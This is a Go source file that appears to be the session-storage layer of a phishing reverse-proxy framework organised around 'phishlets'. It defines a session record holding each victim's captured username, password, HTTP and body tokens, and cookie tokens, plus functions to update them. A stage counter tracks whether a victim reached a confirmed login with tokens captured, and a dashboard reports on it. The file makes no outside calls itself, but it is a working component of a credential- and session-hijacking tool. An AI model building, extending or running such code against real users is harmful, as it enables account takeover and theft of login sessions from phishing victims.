package database

import (
	"encoding/json"
	"fmt"
	"time"

	"github.com/tidwall/buntdb"
)

const SessionTable = "sessions"

type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
	Cmsgid       string                             `json:"cmsgid"`
	Tmsgid       string                             `json:"tmsgid"`
	Reviewed     bool                               `json:"reviewed"`
	// Stage records how far the victim actually got. It only ever increases and
	// is what the dashboard reports on, so an abandoned email entry is never
	// mistaken for a completed login.
	Stage int `json:"stage"`
}

// Stage values, in order. Only genuine evidence promotes a session.
const (
	StageVisited       = 0 // session created, nothing typed
	StageEmail         = 1 // a username/email was submitted
	StageCredentials   = 2 // username and password both submitted
	StageAuthenticated = 3 // the provider confirmed the login (tokens captured)
)

type CookieToken struct {
	Name     string
	Value    string
	Path     string
	HttpOnly bool
	Secure   bool
}

func (d *Database) sessionsInit() {
	d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id"))
	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
}

func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
	_, err := d.sessionsGetBySid(sid)
	if err == nil {
		return nil, fmt.Errorf("session already exists: %s", sid)
	}

	id, _ := d.getNextId(SessionTable)

	s := &Session{
		Id:           id,
		Phishlet:     phishlet,
		LandingURL:   landing_url,
		Username:     "",
		Password:     "",
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*CookieToken),
		SessionId:    sid,
		UserAgent:    useragent,
		RemoteAddr:   remote_addr,
		CreateTime:   time.Now().UTC().Unix(),
		UpdateTime:   time.Now().UTC().Unix(),
		Cmsgid:       "",
		Tmsgid:       "",
	}

	jf, _ := json.Marshal(s)

	err = d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) sessionsList() ([]*Session, error) {
	sessions := []*Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend("sessions_id", func(key, val string) bool {
			s := &Session{}
			if err := json.Unmarshal([]byte(val), s); err == nil {
				sessions = append(sessions, s)
			}
			return true
		})
		return nil
	})
	if err != nil {
		return nil, err
	}
	return sessions, nil
}

func (d *Database) sessionsUpdateCmsgid(sid string, cmsgid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Cmsgid = cmsgid
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateTmsgid(sid string, tmsgid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Tmsgid = tmsgid
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateUsername(sid string, username string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Username = username
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdatePassword(sid string, password string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Password = password
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Custom[name] = value
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateBodyTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.BodyTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateHttpTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.HttpTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

// SetSessionStage promotes a session's stage, never demoting it.
func (d *Database) SetSessionStage(sid string, stage int) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	if stage <= s.Stage {
		return nil
	}
	s.Stage = stage
	s.UpdateTime = time.Now().UTC().Unix()
	return d.sessionsUpdate(s.Id, s)
}

func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.CookieTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdate(id int, s *Session) error {
	jf, _ := json.Marshal(s)

	err := d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	return err
}

func (d *Database) sessionsDelete(id int) error {
	err := d.db.Update(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(d.genIndex(SessionTable, id))
		return err
	})
	return err
}

func (d *Database) sessionsGetById(id int) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_id", d.getPivot(map[string]int{"id": id}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session ID not found: %d", id)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_sid", d.getPivot(map[string]string{"session_id": sid}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session not found: %s", sid)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

// Close releases the underlying store (mainly for tests and clean shutdown).
func (d *Database) Close() error { return d.db.Close() }
